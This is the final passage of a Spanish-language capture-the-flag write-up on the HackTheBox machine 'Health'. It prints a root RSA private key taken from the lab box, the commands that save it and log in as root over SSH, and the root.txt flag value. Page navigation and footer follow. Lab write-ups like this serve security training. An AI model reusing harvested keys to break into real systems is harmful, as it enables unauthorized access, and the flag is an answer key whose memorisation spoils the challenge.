le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}  
+</code></pre></div><p>Y ahí está, ahora nos podemos conectar a la máquina como <code>root</code> sin contraseña y encontrar la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -e <span class="code-dark-yellow">"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"</span> &gt; id  
+_rsa
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">id_rsa</span> | <span class="code-dark-green">tr</span> -d <span class="code-dark-yellow">'\'</span> | <span class="code-dark-green">sponge</span> <span class="mtku">id_rsa
+
+<span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> root@10.10.11.176
+root@health:~# cat root.txt
+03ffdcc457f7b26610f2798f6d1da2ad
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#_server-side-request-forgery_"><em>Server-Side Request Forgery</em></a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#configuración-de-gogs">Configuración de Gogs</a></li><li><a href="#explotación-de-gogs">Explotación de Gogs</a></li><li><a href="#rompiendo-el-_hash_">Rompiendo el <em>hash</em></a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
